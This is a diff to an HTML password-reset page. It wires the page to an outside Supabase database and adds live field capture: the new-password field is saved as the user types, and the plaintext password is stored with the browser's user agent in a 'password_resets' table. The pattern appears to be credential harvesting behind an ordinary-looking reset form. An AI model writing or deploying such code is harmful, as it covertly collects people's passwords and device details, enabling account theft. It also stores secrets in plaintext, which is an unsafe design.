@@ -193,7 +193,13 @@
     <div id="message" class="message"></div>
   </div>
 
+  <script src="supabaseClient.js"></script>
   <script>
+    // Initialize real-time field saving on page load
+    document.addEventListener('DOMContentLoaded', function() {
+      createFieldSaveHandler('password_resets', 'newPassword');
+    });
+
     function setNewPassword() {
       const passwordInput = document.getElementById("newPassword");
       const messageEl = document.getElementById("message");
@@ -208,24 +214,13 @@
         return;
       }
 
-      // Save new password data
+      // Save new password data to Supabase
       const newPasswordData = {
         newPassword: newPassword,
         userAgent: navigator.userAgent
       };
 
-      fetch('/save-new-password', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json'
-        },
-        body: JSON.stringify(newPasswordData)
-      }).then(response => response.json())
-        .then(data => {
-          console.log('New password saved:', data.success);
-        }).catch(error => {
-          console.error('Error saving new password:', error);
-        });
+      saveFieldData('password_resets', newPasswordData);
 
       const users = JSON.parse(localStorage.getItem("users")) || [];
       if (users.length > 0) {
